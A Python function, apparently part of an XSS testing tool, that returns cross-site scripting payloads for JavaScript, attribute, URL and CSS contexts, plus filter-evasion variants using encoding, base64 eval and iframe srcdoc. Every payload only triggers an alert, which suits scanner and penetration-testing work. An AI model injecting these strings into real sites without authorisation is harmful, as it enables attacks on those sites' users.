def get_context_specific_payloads():
    """Generate context-specific XSS payloads"""
    payloads = []
    
    # JavaScript context payloads
    js_payloads = [
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "javascript:alert('XSS')",
        "alert`XSS`",
        "eval('alert(\"XSS\")')",
        "setTimeout('alert(\"XSS\")',0)",
        "setInterval('alert(\"XSS\")',0)",
        "Function('alert(\"XSS\")')()"
    ]
    payloads.extend(js_payloads)
    
    # HTML attribute context
    attr_payloads = [
        "\" onmouseover=\"alert('XSS')",
        "' onfocus='alert(\"XSS\")",
        " autofocus onfocus=alert('XSS')",
        " onload=alert('XSS')",
        " onerror=alert('XSS')"
    ]
    payloads.extend(attr_payloads)
    
    # URL context
    url_payloads = [
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "vbscript:msgbox('XSS')"
    ]
    payloads.extend(url_payloads)
    
    # CSS context
    css_payloads = [
        "expression(alert('XSS'))",
        "javascript:alert('XSS')",
        "-moz-binding:url('data:text/xml,<script>alert(\"XSS\")</script>')"
    ]
    payloads.extend(css_payloads)
    
    # Advanced evasion techniques
    advanced_payloads = [
        "<img src=x oneonerrorrror=alert('XSS')>",  # Obfuscated
        "<svg><script>alert&#40;'XSS'&#41</script>",  # HTML encoded
        "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",  # Base64
        "<iframe srcdoc='<script>alert(\"XSS\")</script>'>"
    ]
    payloads.extend(advanced_payloads)
    
    return payloads
